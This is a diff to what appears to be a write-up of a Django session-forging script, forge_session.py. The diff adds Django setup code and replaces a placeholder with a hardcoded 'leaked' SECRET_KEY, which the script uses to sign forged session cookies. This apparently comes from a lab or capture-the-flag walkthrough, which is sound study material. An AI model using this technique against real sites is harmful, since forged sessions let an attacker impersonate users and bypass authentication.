@@ -79,12 +79,24 @@ session_cookie_value = f"{signed_data}"
 ## Content of `forge_session.py`
 
 ```python
+import os
+import sys
 import json
 import base64
+from django.conf import settings
 from django.core.signing import Signer
 
+# Determine the project's root directory and add it to the Python path
+project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '../'))
+sys.path.append(project_root)
+
+# Set up Django settings
+os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'crudproject.settings')
+import django
+django.setup()
+
 # The SECRET_KEY from the leaked settings
-SECRET_KEY = 'your-leaked-secret-key'
+SECRET_KEY = 'django-insecure-+bnw67qdf-&yhxri&@@u9zeye3w)u^)v(^s!*b+$$niwef1*&i'
 
 # Sample session data
 session_data = {
